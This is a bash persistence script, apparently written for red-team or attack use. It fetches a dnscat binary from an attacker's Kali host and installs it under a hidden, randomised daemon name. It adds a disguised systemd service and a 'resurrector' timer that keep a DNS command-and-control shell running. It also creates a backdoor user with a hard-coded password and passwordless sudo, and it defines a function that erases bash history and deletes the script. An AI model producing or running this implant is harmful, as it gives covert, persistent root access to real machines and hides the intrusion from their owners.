#!/bin/bash

# Written by Garrett H.

# Set Kali machine details
KALI_IP="..."  # IP address of the Kali machine hosting the dnscat shell
PORT="8080"    # Port for the connection
BINARY_NAME="dnscat"  # Name of the binary being downloaded
INSTALL_DIR="/usr/bin"  # Directory to install the binary

# Array of random service names
NAMES=(ldsyncd mountclean netfilterd auditlogd tmpctl serviced dbus-runner core-agent)
RAND_NAME=".${NAMES[$RANDOM % ${#NAMES[@]}]}"  # Randomly pick a name from the array
DEST="$INSTALL_DIR/$RAND_NAME"  # Path where the binary will be saved
SERVICE_NAME="${RAND_NAME#.}.service"  # Create a unique service name
TIMER_NAME="${RAND_NAME#.}.timer"  # Create a unique timer name

# Download the dnscat binary from the Kali machine
curl -s http://$KALI_IP:$PORT/$BINARY_NAME -o $DEST
chmod +x $DEST  # Make the binary executable

# Create a systemd service for the dnscat binary
cat <<EOF > /etc/systemd/system/$SERVICE_NAME
[Unit]
Description=System Daemon Core Runner
After=network.target  # Ensure network is available before starting

[Service]
Type=simple
ExecStart=$DEST --dns server=$KALI_IP,port=443  # Start the dnscat binary with DNS options
Restart=always  # Ensure the service restarts on failure
RestartSec=5  # Restart after 5 seconds if it crashes

[Install]
WantedBy=multi-user.target  # Start service during normal boot
EOF

# Create a systemd timer to ensure the service runs on boot and periodically
cat <<EOF > /etc/systemd/system/$TIMER_NAME
[Unit]
Description=Resurrector for stealth service

[Timer]
OnBootSec=2min  # Start 2 minutes after boot
OnUnitInactiveSec=15min  # Check every 15 minutes if the service is inactive
Unit=$SERVICE_NAME  # Timer triggers the service

[Install]
WantedBy=timers.target  # Enable timer during boot
EOF

# Reload systemd, enable and start the service and timer
systemctl daemon-reexec  # Reexec the systemd manager to apply new changes
systemctl daemon-reload  # Reload systemd configuration to recognize new service and timer
systemctl enable $SERVICE_NAME  # Enable the service to start on boot
systemctl enable $TIMER_NAME  # Enable the timer to run the service periodically
systemctl start $SERVICE_NAME  # Start the dnscat service
systemctl start $TIMER_NAME  # Start the timer to check service status

# Create backup group and user for persistence
groupadd backupadmins  # Create a group for backup users
# Check if the group already has sudo permissions, if not, add it
if ! grep -q 'backupadmins' /etc/sudoers; then
    echo 'backupadmins ALL=(ALL) NOPASSWD:ALL' | sudo tee -a /etc/sudoers
fi
useradd -m -G backupadmins -s /bin/bash rsyncd  # Create a user 'rsyncd' in the backupadmins group
echo "rsyncd:R3b3ll10n" | chpasswd  # Set password for the new user

# Cleanup function to clear bash history and delete the script
cleanup() {
    echo "[+] Clearing bash history and deleting script..."
    history -c  # Clear bash history
    unset HISTFILE  # Unset the history file variable
    if [ -f "$0" ]; then
        rm -- "$0"  # Delete the script itself
    fi
}

# Output information to indicate the actions taken
echo "[+] Dropped binary to $DEST"
echo "[+] Created and enabled service: $SERVICE_NAME"
echo "[+] Created and enabled timer fallback: $TIMER_NAME"
